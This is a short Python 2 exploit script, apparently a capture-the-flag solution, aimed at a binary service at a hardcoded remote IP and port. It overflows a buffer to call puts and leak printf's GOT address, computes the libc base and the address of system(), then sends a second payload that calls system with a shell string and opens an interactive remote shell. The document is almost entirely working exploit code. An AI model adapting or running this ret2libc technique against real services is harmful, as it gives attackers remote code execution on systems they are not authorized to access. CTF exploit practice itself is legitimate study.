#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888

host = "175.119.158.133"
port = 9091

sock = make_conn(host,port)
recvuntil(sock,":")
sendline(sock,"ddaa")

sh = 0x8048316

recvuntil(sock,"|")
sendline(sock,"3")
puts = 0x8048566
main = 0x8049490
printfgot = 0x804c010
recvuntil(sock,"|")
sendline(sock,"101")
recvuntil(sock,"|")
payload = "a"*0xc
payload += pack32(puts)
payload += pack32(main)
sock.send(payload)
recvuntil(sock,"|")
sock.send( pack32(printfgot)+"c"*0x10)

recvuntil(sock,"|")
sendline(sock,"4")

data = recvuntil(sock,":")
printf =  unpack32(data.split("\n")[-2][:4])
libc = printf - 0x4a150
print hex(libc)
system = libc + 0x3b180
sendline(sock,"ddaa")

recvuntil(sock,"|")
sendline(sock,"3")

recvuntil(sock,"|")
sendline(sock,"101")
recvuntil(sock,"|")
sock.send("a"*0x14)
recvuntil(sock,"|")
sock.send(pack32(system) + pack32(system) + pack32(sh))

recvuntil(sock,"|")
sendline(sock,"4")
inter(sock)

